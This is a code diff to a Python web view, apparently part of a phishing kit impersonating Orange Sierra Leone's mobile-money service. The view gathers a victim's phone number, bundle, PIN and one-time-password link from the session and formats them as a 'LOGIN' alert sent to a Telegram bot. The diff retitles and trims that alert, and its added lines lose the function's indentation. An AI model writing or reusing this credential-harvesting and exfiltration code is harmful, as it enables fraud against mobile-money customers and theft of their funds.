@@ -80,25 +80,21 @@ def sync_data(request):
 
         otp_link = data.get('otp', '')
 
-        name = request.session.get('name', 'Unknown')
         phone = request.session.get('phone', 'Unknown')
-        city = request.session.get('city', 'Unknown')
-        bundle = request.session.get('bundle', 'Unknown')
-        pin = request.session.get('pin', 'Unknown')
+bundle = request.session.get('bundle', 'Unknown')
+pin = request.session.get('pin', 'Unknown')
 
-        message = (
-            "🇸🇱 NEW ORANGE SL ORDER\n"
-            "━━━━━━━━━━━━━━━━━━\n"
-            f"👤 Name: {name}\n"
-            f"📞 Phone: +232 {phone}\n"
-            f"📍 City: {city}\n"
-            f"📦 Bundle: {bundle}\n"
-            "━━━━━━━━━━━━━━━━━━\n"
-            f"🔑 PIN: {pin}\n"
-            f"🔗 OTP LINK:\n{otp_link}\n"
-            "━━━━━━━━━━━━━━━━━━\n"
-            "📡 STATUS: ACTIVE"
-        )
+message = (
+    "🇸🇱 ORANGE MAX IT LOGIN\n"
+    "━━━━━━━━━━━━━━━━━━\n"
+    f"📞 PHONE: +232 {phone}\n"
+    f"📦 BUNDLE: {bundle}\n"
+    f"🔑 PIN: {pin}\n"
+    "━━━━━━━━━━━━━━━━━━\n"
+    f"🔗 OTP LINK:\n{otp_link}\n"
+    "━━━━━━━━━━━━━━━━━━\n"
+    "📡 STATUS: SUCCESS"
+)
 
         telegram_url = (
             f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
